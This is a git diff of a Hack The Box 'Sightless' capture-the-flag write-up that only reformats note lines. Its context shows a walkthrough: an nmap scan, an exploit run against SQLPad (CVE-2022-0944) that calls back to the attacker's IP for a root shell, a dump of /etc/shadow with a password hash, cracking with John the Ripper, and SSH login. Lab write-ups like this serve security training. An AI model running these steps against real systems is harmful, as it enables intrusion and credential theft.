@@ -1,7 +1,7 @@
 
 https://app.hackthebox.com/machines/Sightless
 
-Nmap scan
+- Nmap scan
 
 > nmap -sCSV -T4 $ip
 ```
@@ -34,11 +34,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 ```
 
-checking http://sightless.htb
-fond http://sqlpad.sightless.htb/
-fond vulnerability in sqlpad - [here](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)
-found more info about the vulnerability - [here](https://github.com/shhrew/CVE-2022-0944?tab=readme-ov-file)
-exploit worked
+- checking http://sightless.htb
+- fond http://sqlpad.sightless.htb/
+- fond vulnerability in sqlpad - [here](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)
+- found more info about the vulnerability - [here](https://github.com/shhrew/CVE-2022-0944?tab=readme-ov-file)
+- exploit worked
 
 > python3 main.py http://sqlpad.sightless.htb/ 10.10.16.30 9999            
 ```
@@ -68,7 +68,7 @@ uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
 
-checking /etc/shadow file
+- checking /etc/shadow file
 
 > cat /etc/shadow
 ```
@@ -95,7 +95,7 @@ node:!:19053:0:99999:7:::
 michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
 ```
 
-seems like user flags can be cracked by john the ripper
+- seems like user flags can be cracked by john the ripper
 
 > john hash -w=/usr/share/wordlists/rockyou.txt    
 ```
@@ -113,7 +113,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-after ssh-ing michael I found the user flag
+- after ssh-ing michael I found the user flag
 
 > ssh michael@10.10.11.32 
 ```        
